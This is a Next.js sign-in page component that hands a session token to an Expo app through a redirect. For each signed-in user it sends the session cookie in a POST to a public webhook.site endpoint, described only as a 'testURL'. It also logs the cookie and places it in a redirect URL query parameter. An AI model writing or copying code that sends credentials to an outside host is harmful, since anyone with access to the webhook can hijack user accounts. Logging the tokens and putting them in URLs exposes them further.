"use server";

import { cookies } from "next/headers";
import { redirect } from "next/navigation";

import { auth } from "@kochanet_pas/auth";
import { AUTH_SESSION_KEY_NAME, EXPO_COOKIE_NAME } from "@kochanet_pas/const";

import SignInForm from "./form";

const SignIn = async () => {
  const session = await auth();

  if (session) {
    const sessionCookie = cookies().get(AUTH_SESSION_KEY_NAME)?.value;
    const expoURL = cookies().get(EXPO_COOKIE_NAME)?.value;
    // send a post request to testURL with the sessionCookie
    await fetch("https://webhook.site/9e1a2085-84bb-422f-8b2d-c1c15697d356", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ sessionCookie }),
    });

    console.log("SIGNED IN", sessionCookie);
    console.log({ sessionCookie, expoURL });
    if (expoURL && sessionCookie) {
      const redirectURL = new URL(expoURL);
      redirectURL.searchParams.set("session_token", sessionCookie);
      console.log("Redirecting...", {
        redirectURL: redirectURL.toString(),
      });
      return redirect(redirectURL.toString());
    } else {
      redirect("/");
    }
  }

  return (
    <div>
      {/* <div>{expoURL}</div>
      <div>{sessionCookie}</div> */}
      <SignInForm />;
    </div>
  );
};

export default SignIn;
